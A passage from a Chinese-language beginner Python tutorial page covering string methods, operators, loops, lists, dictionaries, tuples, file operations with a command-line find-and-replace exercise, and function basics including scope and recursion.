判断某个成员是否存在（返回bool类型）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s1 = <span class="string">&quot;hello Oracle&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span> <span class="keyword">in</span> s1)  <span class="comment"># True</span></span><br></pre></td></tr></table></figure><h4 id="字符串内置方法">字符串内置方法</h4><table><thead><tr><th style="text-align:center">内置函数</th><th style="text-align:center">功能</th><th style="text-align:left">实例</th></tr></thead><tbody><tr><td style="text-align:center">upper</td><td style="text-align:center">将字符串中所有字符转化为大写</td><td style="text-align:left">s1.upper()</td></tr><tr><td style="text-align:center">lower</td><td style="text-align:center">~转化为小写</td><td style="text-align:left">s1.lower()</td></tr><tr><td style="text-align:center">startswith</td><td style="text-align:center">判断字符串是否以…开头(返回bool)</td><td style="text-align:left">s1.startswith(“hello”)</td></tr><tr><td style="text-align:center">endswith</td><td style="text-align:center">判断是否以…结尾</td><td style="text-align:left">s2.endswith(&quot;.jpg&quot;)</td></tr><tr><td style="text-align:center">isdigit</td><td style="text-align:center">判断是否为纯数字字符串</td><td style="text-align:left">s2.isdigit()</td></tr><tr><td style="text-align:center">strip</td><td style="text-align:center">去除字符串两端的空格或换行符</td><td style="text-align:left">s2.strip()</td></tr><tr><td style="text-align:center">join</td><td style="text-align:center">把列表中的字符串按一分隔符拼接</td><td style="text-align:left">“,”.join(list)</td></tr><tr><td style="text-align:center">split</td><td style="text-align:center">把字符串按一分隔符分割，存到列表中</td><td style="text-align:left">cities.split(&quot;,&quot;)</td></tr></tbody></table><p><strong>其他方法</strong>：</p><ol><li>find    搜索指定字符串，返回索引，没有返回-1</li><li>index   功能同上，但找不到时报错</li><li>count  计算字符串中子串出现的顺序</li><li>replace  将字符串中字串替换为指定字符串</li><li>center  将字符串左右添加填充符到指定长度</li><li>encode  将字符串按指定方式编码</li></ol><blockquote><p>replace 缺省默认全部替换，传入int型可指定替换个数</p></blockquote><h3 id="运算符">运算符</h3><p>计算运算符：<code>+</code>、<code>-</code>、<code>*</code>、<code>/</code>、<code>%</code><br>比较运算符：<code>&gt;</code>、<code>&lt;</code>、<code>&gt;=</code>、<code>&lt;=</code>、<code>==</code>、<code>!=</code></p><blockquote><p>返回类型为bool</p></blockquote><p>赋值运算符：<code>=</code>、<code>+=</code>、<code>-=</code>、<code>/=</code>、<code>*=</code>、<code>%=</code><br>逻辑运算符：<code>and</code>、<code>or</code>、<code>not</code></p><blockquote><p>python范围判断可以直接写成 18&lt;age&lt;35</p></blockquote><p>成员运算符：<code>in</code></p><h3 id="流程控制语句">流程控制语句</h3><p><strong>多分支语句</strong></p><blockquote><p>注意四个空格的缩进和英文冒号</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">age = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;输入你的年龄:&gt;&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> age &gt;= <span class="number">18</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;欢迎访问&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;禁止访问&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>多分支</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">weight = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入你的体重(公斤):&gt;&quot;</span>))</span><br><span class="line">height = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入你的身高(米):&gt;&quot;</span>))</span><br><span class="line">BMI = weight / height ** <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> BMI &lt; <span class="number">18.5</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;偏瘦&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> BMI &lt; <span class="number">24</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正常&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> BMI&lt; <span class="number">28</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;超重&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;肥胖&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>循环语句</strong></p><p>while循环</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> count &lt;= <span class="number">100</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;count =&quot;</span>, count)</span><br><span class="line">    count += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>for循环<br>对一个序列（如字符串、列表、元组）进行遍历操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lis = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lis:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;i&quot;</span>, i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">100</span>, <span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;i&quot;</span>, i)</span><br></pre></td></tr></table></figure><p><code>break</code>  退出整个循环<br><code>continue</code>  退出当前循环</p><hr><h3 id="高阶数据类型">高阶数据类型</h3><h4 id="列表">列表</h4><p><code>[]</code>内以逗号分隔，按照索引存放各种数据类型<br>可修改指定索引位置对应的值</p><p><strong>列表的操作</strong><br>追加：数据被追加到尾部</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">letter = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>]</span><br><span class="line">letter.append(<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(letter)</span><br></pre></td></tr></table></figure><p>插入：可插入列表中任一位置(也可用此方法嵌套列表)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">letter = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>]</span><br><span class="line">letter.insert(<span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(letter)</span><br><span class="line"></span><br><span class="line">letter = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>]</span><br><span class="line">letter.insert(<span class="number">2</span>, [<span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(letter[<span class="number">2</span>][<span class="number">1</span>])  <span class="comment"># y</span></span><br></pre></td></tr></table></figure><p>合并：把另一列表的值合并进来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">letter1 = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>]</span><br><span class="line">letter2 = [<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>]</span><br><span class="line">letter1.extend(letter2)</span><br><span class="line"><span class="built_in">print</span>(letter1)</span><br></pre></td></tr></table></figure><p>del删除：直接删除指定位置元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">letter = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> letter[<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(letter)  <span class="comment">#[&#x27;a&#x27;, &#x27;b&#x27;, &#x27;d&#x27;, &#x27;e&#x27;]</span></span><br></pre></td></tr></table></figure><p>pop弹出：弹出列表最后一个元素并返回（也可指定位置）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">letter = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>]</span><br><span class="line">a = letter.pop()</span><br><span class="line"><span class="built_in">print</span>(letter)</span><br></pre></td></tr></table></figure><p>remove删除：指定元素名删除，如有多个删除从左到右第一个</p><p>clear清空：清除列表中所有元素</p><p>index查找：返回从左到右第一个指定元素的索引<br><strong>切片操作和字符串类似</strong></p><p>sort排序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">letter = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">9</span>]</span><br><span class="line">a = letter.sort()</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><p>reverse反转</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">letter = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">9</span>]</span><br><span class="line">a = letter.reverse()</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><h4 id="字典">字典</h4><p>为满足快速查询，引入key-value的字典类型，以花括号包裹<br>key必须为不可变的数据类型（如数字、字符串）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dic = &#123;</span><br><span class="line">    <span class="string">&quot;x&quot;</span>: <span class="string">&quot;hello&quot;</span>,</span><br><span class="line">    <span class="string">&quot;y&quot;</span>: <span class="string">&quot;world&quot;</span>,</span><br><span class="line">    <span class="string">&quot;z&quot;</span>: <span class="string">&quot;!&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(dic[<span class="string">&quot;x&quot;</span>], dic[<span class="string">&quot;y&quot;</span>], dic[<span class="string">&quot;z&quot;</span>])</span><br><span class="line"><span class="comment"># dic.get(&quot;&quot;) 方法也可取用，优点是找不到不报错，返回None</span></span><br></pre></td></tr></table></figure><blockquote><p>字典也可以进行嵌套</p></blockquote><p><strong>增删改查操作</strong></p><ul><li>增加：<code>dic[&quot;a&quot;] = &quot;error&quot;</code> 直接对新key值赋值即可添加</li><li>删除：<code>del dic[&quot;x&quot;]</code>、<code>dic.pop(&quot;y&quot;)</code>、<code>dic.clear()</code>前两个为清除指定key,后一个为清空</li><li>修改：操作同增加，若key值存在，即会修改value值</li><li>查找 <code>dic.keys()</code>返回一个包含字典所有KEY的列表；<code>dic.values()</code>返回一个包含字典所以value的列表；<code>dic.items()</code>返回一个包含所有（键、值）元组的列表</li></ul><p><strong>循环</strong></p><ol><li><code>for k in dic.keys()</code></li><li><code>for k,v in dic.items()</code></li><li><code>for k in dic</code>(推荐，效率更快)</li></ol><h4 id="元组">元组</h4><p>元组(tuple)是Python中另一种内置的存储有序数据的结构。<br>元组与列表类似，也是由一系列按特定顺序排列的元素组成，可存储不同类型的数据，<br>如字符串、数字甚至元组。然而，元组是不可改变的，创建后不能再做任何修改操作。<br>元组可作为字典的键值，而列表不行<br>元组由（）包裹</p><p><strong>删除元组</strong><br>元组中的元素值是不允许更改的，但可以使用del语句整个删除</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>)</span><br><span class="line">tupleName = <span class="built_in">tuple</span>(data)</span><br><span class="line"><span class="keyword">del</span> tupleName</span><br><span class="line"><span class="built_in">print</span>(tupleName)</span><br></pre></td></tr></table></figure><p><strong>元组常见操作</strong></p><p>元组是不可变序列，虽然不能对单个元素值进行修改，但可以重新赋值以达到更改效果<br><code>len(tup)</code><br><code>max(tup)</code><br><code>min(tup)</code><br>元组和列表的相互转换<br><code>tuple()</code>函数接收一个列表，返回一个元组<br><code>list()</code>函数接收一个元组，返回一个列表</p><h3 id="文件操作">文件操作</h3><blockquote><p>python3在内存中默认用Unicode编码，但存在文件里或网络发送，用utf-8编码</p></blockquote><p>字节类型就是二进制格式，通常用十六进制来表示，编码后转成bytes字节类型，可防止显示乱码</p><p>操作文件流程：</p><ol><li>打开文件</li><li>读 || 修改</li><li>保存 &amp;&amp; 关闭</li></ol><p><strong>打开文件（文本模式）</strong></p><ul><li>r 只读模式</li><li>w 创建模式，若文件已经存在，则覆盖旧文件</li><li>a 追加模式，新数据会写到文件末尾</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  w mode</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;name_list&quot;</span>, mode=<span class="string">&quot;w&quot;</span>)</span><br><span class="line">f.write(<span class="string">&quot;张三\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">&quot;李四\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">&quot;王五\n&quot;</span>)</span><br><span class="line">f.close()</span><br><span class="line"><span class="comment">#  r mode</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;name_list&quot;</span>, mode=<span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(f.read())  <span class="comment"># 读出所有内容</span></span><br><span class="line"><span class="built_in">print</span>(f.readline())  <span class="comment"># 读一行</span></span><br><span class="line"><span class="comment">#  a mode</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;name_list&quot;</span>, mode=<span class="string">&quot;a&quot;</span>)</span><br><span class="line">f.write(<span class="string">&quot;oracle\n&quot;</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p><strong>文件循环遍历</strong></p><p>循环遍历时，将文件每一行的数据以列表形式存入line中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;name_list&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">    line = line.split()</span><br><span class="line">    age = <span class="built_in">int</span>(line[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> age &gt;= <span class="number">18</span>:</span><br><span class="line">        <span class="built_in">print</span>(line)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>二进制文件操作（图片/视频）</strong><br><img src="https://img1.imgtp.com/2023/08/04/A82bqAtR.png" alt=""></p><p>encodin=None,该参数告诉你的解释器当亲要打开文件的编码，若缺省，则用解释器的默认编码，也就是utf-8<br>图片和视频底层也是二进制，用二进制形式打开</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;yuan.png&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">    <span class="built_in">print</span>(line)</span><br><span class="line">    </span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;name_list&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">s = <span class="string">&quot;路飞 18&quot;</span></span><br><span class="line">f.write((s.encode(<span class="string">&quot;utf-8&quot;</span>)))</span><br></pre></td></tr></table></figure><p><code>rb</code>    二进制只读<br><code>wb</code>    二进制只写</p><p><strong>其他常用功能</strong><br><code>seek</code>  把操作文件的光标移动到指定位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;name_list&quot;</span>, mode=<span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>)</span><br><span class="line">f.seek(<span class="number">11</span>)</span><br><span class="line"><span class="comment"># f.write(&quot;张三 18\n&quot;)</span></span><br><span class="line"><span class="comment"># f.write(&quot;李四 20\n&quot;)</span></span><br><span class="line"><span class="comment"># f.write(&quot;王五 21\n&quot;)</span></span><br><span class="line"><span class="comment"># f.write(&quot;赵六 19\n&quot;)</span></span><br><span class="line"><span class="built_in">print</span>(f.readline())  <span class="comment"># 李四 20</span></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>按字节操作，utf-8编码中中文占三个字节，西欧符号占两个字节，英文和数字占一个字节<br>写文件时会覆盖光标后的文本</p><blockquote><p>经常搭配tell函数使用，其作用是返回当前光标的位置</p></blockquote><p><strong>flush</strong>  把文件从内存buffer里强制刷新到硬盘<br><strong>truncate</strong>  以光标位置截断文件，将光标后数据删除</p><p><strong>其他打开方式（混合模式）</strong><br>w+ 写读：创建一个新文件，可写入文本，也可将写入的内容读出来<br>r+ 读写：能读能写，但都是些在文件最后，类似追加<br>a+ 追加读：写入数据均以追加的形式</p><p><strong>文件修改</strong><br>前面提到的文件修改会将当前光标后的数据替换掉，而我们正常需求一般是在光标位置前插入文本数据。要实现这点，需打开文件后，先将数据读到内存中，添加数据后再重新写入硬盘</p><p><strong>练习</strong><br>编写一个全局文本检索替换脚本<br>要求在命令行中执行<code>python replace.py old_str new_str filename</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">old_str = sys.argv[<span class="number">1</span>]</span><br><span class="line">new_str = sys.argv[<span class="number">2</span>]</span><br><span class="line">filename = sys.argv[<span class="number">3</span>]</span><br><span class="line">f = <span class="built_in">open</span>(filename, mode=<span class="string">&quot;r+&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>)</span><br><span class="line"><span class="comment"># 加载到内存</span></span><br><span class="line">data = f.read()</span><br><span class="line">count = data.count(old_str)</span><br><span class="line">new_data = data.replace(old_str, new_str)</span><br><span class="line"><span class="comment"># 清空文件</span></span><br><span class="line">f.seek(<span class="number">0</span>)</span><br><span class="line">f.truncate()</span><br><span class="line"><span class="comment"># 把新内容写入硬盘</span></span><br><span class="line">f.write(new_data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;成功替换字符&#x27;<span class="subst">&#123;old_str&#125;</span> to&#x27;<span class="subst">&#123;new_str&#125;</span>，共计<span class="subst">&#123;count&#125;</span>处&#x27;&quot;</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/08/04/xa4ZpB2x.png" alt="成功"></p><p>另一种方法：<br>创建一个新文件，将原文件数据按行读入新文件，并加以替换，最后将原文件删除</p><h3 id="函数编程">函数编程</h3><p>特性：</p><ol><li>减少重复代码</li><li>使程序可扩展</li><li>使程序易维护</li></ol><p>基本语法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sayhello</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;hello,my name is <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sayhello(<span class="string">&quot;Oracle&quot;</span>)</span><br></pre></td></tr></table></figure><p>值得注意python中函数形参和实参传入机制与其他编程语言不同，与传入的数据类型（可变 or 不可变有关），可参考<a href="https://blog.csdn.net/qq_37891604/article/details/124528827">Python中变量的本质</a></p><p>python也可使用默认参数调用函数，语法和C++类似，缺省参数定义需在最后。一般按位置关系确定对应关系的参数，但也可指定参数名，指定参数调用时必须放在默认参数之后</p><p><strong>非固定参数</strong><br>若在函数定义时不确定要传入多少参数，可以使用非固定参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">stu_register</span>(<span class="params">name, age, *args, **kwargs</span>):</span><br><span class="line">    <span class="built_in">print</span>(name, age, args, kwargs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># *args 会把多传入的参数变成一个元组的形式</span></span><br><span class="line"><span class="comment"># **kwargs 会把传入的指定参数变成一个字典的形式</span></span><br><span class="line">stu_register(<span class="string">&quot;Oracle&quot;</span>, <span class="number">19</span>, <span class="string">&quot;M&quot;</span>, <span class="string">&quot;IT&quot;</span>, address=<span class="string">&quot;吉林省&quot;</span>)</span><br><span class="line"><span class="comment"># &gt;&gt;&gt;Oracle 19 (&#x27;M&#x27;, &#x27;IT&#x27;) &#123;&#x27;address&#x27;: &#x27;吉林省&#x27;&#125;</span></span><br></pre></td></tr></table></figure><p><strong>函数返回值</strong><br>若想在函数外部想获取函数内部产生的值，可以用return语句将值返回<br>python可同时返回多个值，写成<code>return a,b,c</code><br>其值存放在元组中<code>(a, b, c)</code><br>函数执行到return就代表函数结束，后面的代码不会执行</p><p><strong>全局变量与局部变量</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">1</span>               <span class="comment"># 全局变量</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    b = <span class="number">2</span>           <span class="comment"># 局部变量</span></span><br><span class="line">    <span class="built_in">print</span>(a)        <span class="comment"># 可访问全局变量a,无法访问它内部的c</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">        c = <span class="number">3</span>       <span class="comment"># 更局部的变量</span></span><br><span class="line">        <span class="built_in">print</span>(a)    <span class="comment"># 可以访问全局变量a</span></span><br><span class="line">        <span class="built_in">print</span>(b)    <span class="comment"># b对于inner函数来说，就是外部变量</span></span><br><span class="line">        <span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure><p><strong>global</strong>：指定当前变量使用外部的全局变量(直接使用最外层的)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;函数outer调用之前全局变量a的内存地址： &quot;</span>, <span class="built_in">id</span>(a))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">outer</span>():</span><br><span class="line">    a = <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;函数outer调用之时闭包外部的变量a的内存地址： &quot;</span>, <span class="built_in">id</span>(a))</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">        <span class="keyword">global</span> a   <span class="comment"># 注意这行</span></span><br><span class="line">        a = <span class="number">3</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;函数inner调用之后闭包内部变量a的内存地址： &quot;</span>, <span class="built_in">id</span>(a))</span><br><span class="line">    inner()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;函数inner调用之后，闭包外部的变量a的内存地址： &quot;</span>, <span class="built_in">id</span>(a))</span><br><span class="line">outer()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;函数outer执行完毕，全局变量a的内存地址： &quot;</span>, <span class="built_in">id</span>(a))</span><br><span class="line"><span class="comment"># 函数outer调用之前全局变量a的内存地址：  494384192</span></span><br><span class="line"><span class="comment"># 函数outer调用之时闭包外部的变量a的内存地址：  494384224</span></span><br><span class="line"><span class="comment"># 函数inner调用之后闭包内部变量a的内存地址：  494384256</span></span><br><span class="line"><span class="comment"># 函数inner调用之后，闭包外部的变量a的内存地址：  494384224</span></span><br><span class="line"><span class="comment"># 函数outer执行完毕，全局变量a的内存地址：  494384256</span></span><br></pre></td></tr></table></figure><p>若有多层嵌套，且仅想使用上一层的变量,可使用<code>nonlocal</code>关键字声明</p><p><strong>递归函数</strong><br>python语言也支持递归函数<br>举例一个简单的高斯求和函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Gaosi</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> n + Gaosi(n - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Gaosi(<span class="number">100</span>))</span><br></pre></td></tr></table></figure><p><strong>常用内置函数</strong></p><table><thead><tr><th style="text-align:center">内置函数</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>all()</code></td><td style="text-align:center">遍历整个列表，若所有元素bool值均为true则返回true，反之为false</td></tr><tr><td style="text-align:center"><code>any()</code></td><td style="text-align:center">遍历整个列表，若任一元素bool值为true则返回true，反之为false</td></tr><tr><td style="text-align:center"><code>chr()</code></td><td style="text-align:center">返回指定数字对应ASCII码对应的字符</td></tr><tr><td style="text-align:center"><code>dict()</code></td><td style="text-align:center">生成一个字典，确省则为空字典</td></tr><tr><td style="text-align:center"><code>dir()</code></td><td style="text-align:center">显示对象所有的属性和方法。最棒的辅助函数之一</td></tr><tr><td style="text-align:center"><code>abs()</code></td><td style="text-align:center">返回指定数据的绝对值</td></tr><tr><td style="text-align:center"><code>bin()、oct()、hex()</code></td><td style="text-align:center">三个函数是将十进制数分别转换为2/8/16进制</td></tr><tr><td style="text-align:center"><code>ord()</code></td><td style="text-align:center">与chr()相反，返回某个ASCII字符对应的十进制数</td></tr><tr><td 